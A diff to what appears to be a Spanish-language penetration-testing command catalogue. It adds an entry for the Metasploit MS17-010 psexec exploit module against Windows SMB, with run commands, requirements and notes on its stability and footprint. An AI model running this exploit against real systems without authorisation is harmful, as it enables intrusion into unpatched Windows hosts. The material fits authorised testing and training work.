@@ -316,6 +316,23 @@ commands:
       con smb_ms17_010.
     refs: [https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/]
 
+  - id: msf-ms17-010-psexec
+    title: MS17-010 por psexec, la alternativa estable a EternalBlue
+    cmd: |
+      use exploit/windows/smb/ms17_010_psexec
+      set RHOSTS {{RHOST}}
+      set LHOST {{LHOST}}
+      set LPORT {{LPORT}}
+      run
+    phase: initial-access
+    tags: [smb, ms17-010]
+    notes: >-
+      Usa otros fallos del mismo boletín (EternalRomance, EternalSynergy, EternalChampion) para
+      convertir su sesión SMB en una de administrador y ejecuta como psexec: no toca el pool del kernel
+      y rara vez tumba el equipo. Necesita un named pipe accesible; si no hay sesión anónima, pasa
+      cualquier usuario válido en SMBUser y SMBPass. Instala un servicio (evento 7045).
+    refs: [https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_psexec/]
+
   - id: msf-psexec
     title: PsExec con pass-the-hash
     cmd: |
